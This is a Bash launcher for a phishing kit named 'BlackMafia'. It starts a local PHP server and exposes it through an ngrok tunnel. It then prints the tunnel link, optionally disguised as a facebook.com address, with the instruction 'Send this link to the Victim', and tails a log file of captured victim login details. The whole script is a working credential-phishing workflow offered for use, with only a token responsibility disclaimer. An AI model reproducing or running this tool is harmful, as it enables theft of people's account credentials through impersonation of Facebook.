#!/bin/bash
clear
echo ""
echo ""
printf "\e[100;330m⛔\e[1;40m\e[10m BlackMafia SERVER Conecting....\e[0m"
sleep 2
echo ""
printf "\e[100;330m⛔\e[1;40m\e[10m TURN ON MOBILE DATA & HOTSPOT!\e[0m"
sleep 4
echo ""
printf "\e[100;330m⛔\e[1;40m\e[10m OTHERWISE IT WILL NOT WORK!\e[0m"
sleep 3
echo ""
clear
echo ""
echo ""
echo ""
read -p $'\e[100;330m⛔\e[1;40m\e[10m How you use this information is your responsibility\e[1;91m (Y/N) : \e[0m' option
echo""
echo""
echo""

if [[ $option == *'N'* ]]; then
clear
exit
fi
if [[ $option == *'n'* ]]; then
clear
exit
fi

php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
kill -9 $php
kill -9 $ngrok
clear
bash Logo.sh
cat Logo.txt | lolcat
echo ""
echo "" 
                 read -p $'\e[1;91m[\e[0m\e[1;91m⛔\e[0m\e[1;96m]\e[0m\e[1;96m Choose Any Option\e[1;91m>>\e[0m' option
                 echo ""
		 if [ $option = 01 ] || [ $option = 1 ]
                 then
	                   cd BlackMafia/
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 3
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           sleep 25
                           clear
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
                           cat lovehacker404
                           echo -e "\e[96m==========\e[91m INFORMATION OF VICITM \e[96m========== \e[93m"
                           echo ""
                           echo "" 
                           read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                           echo ""
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;35m Send this link to the Target :\e[0m\e[1;71m %s\e[0m\n" https://www.facebook.com-@$link                                    
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                           else
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;35m Send this link to the Target :\e[0m\e[1;72m %s\e[0m\n" https://$link
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;95m ==Send this link to the Victim login=\e[0m'
                           fi
                           
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f log.txt    
                          
                break;   
                elif [ $option = 99 ]
	        then     
	                 echo
       	                 exit 
		break;
		      
                else 
		  
		         echo
		         echo -e "\e[92m[\e[94m!\e[92m]\e[92m Invalid option Try Again !! \e[m "
		         sleep 2
                         exit
		         fi
                         done
